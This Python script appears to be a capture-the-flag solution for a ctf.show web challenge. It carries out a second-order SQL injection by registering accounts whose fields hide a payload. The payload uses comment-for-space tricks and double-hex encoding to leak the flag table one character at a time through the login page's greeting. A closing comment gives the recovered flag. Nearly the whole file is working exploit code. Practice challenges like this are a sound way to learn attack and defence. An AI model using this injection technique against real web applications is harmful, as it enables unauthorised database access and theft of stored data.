import requests
import re

url1 = "http://fc0210ac-f502-4f2e-b093-22d604742dc4.challenge.ctf.show/register.php"
url2 = "http://fc0210ac-f502-4f2e-b093-22d604742dc4.challenge.ctf.show/login.php"
flag = ''
for i in range(1,50):
    payload="hex(hex(substr((select/**/flag/**/from/**/flag)from/**/"+str(i)+"/**/for/**/1))),/*"
    print(payload)
    s = requests.session()
    data1 = {
        'e':str(i+30)+"',username="+payload,
        'u':"*/#",
        'p':i+30
        }
    #print(data1['e'])
    r1 = s.post(url1,data=data1)  
    data2 = {
        'e':i+30,
        'p':i+30
        }
    r2 = s.post(url2,data=data2)
    t = r2.text
    matches = re.findall(r"Hello (.*?),", t)
    if matches:
        real = matches[0]
        flag += real
        print(flag)
    else:
        real = None
        s = bytes.fromhex(flag).decode()
        flag = bytes.fromhex(s).decode()
        print(flag)
        break
# 363337343636373336383646373737423330363433353338363633363330333332443336333333383634324433343333333036323244363133353631333932443636363236343337333436333334333233313633333133393744
# ctfshow{0d58f603-638d-430b-a5a9-fbd74c421c19}